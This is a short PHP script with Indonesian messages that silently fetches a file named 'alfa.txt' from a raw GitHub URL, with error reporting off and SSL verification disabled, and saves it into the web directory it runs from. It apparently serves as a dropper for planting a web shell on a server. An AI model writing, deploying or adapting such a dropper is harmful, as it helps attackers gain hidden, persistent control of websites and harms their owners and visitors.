<?php
error_reporting(0);

$remote_file = "https://raw.githubusercontent.com/danielyzx123/alfa.txt/refs/heads/main/alfa.txt";
$local_file = __DIR__ . "/alfa.txt";

if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_file);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($ch);
    curl_close($ch);
} else {
    die("CURL tidak tersedia, dan allow_url_fopen dimatikan. Tidak bisa download file.");
}

if (!empty($content)) {
    if (file_put_contents($local_file, $content)) {
        echo "File berhasil diunduh dan disimpan: " . $local_file;
    } else {
        echo "Gagal menyimpan file. Periksa permission folder.";
    }
} else {
    echo "Gagal download file.";
}
?>
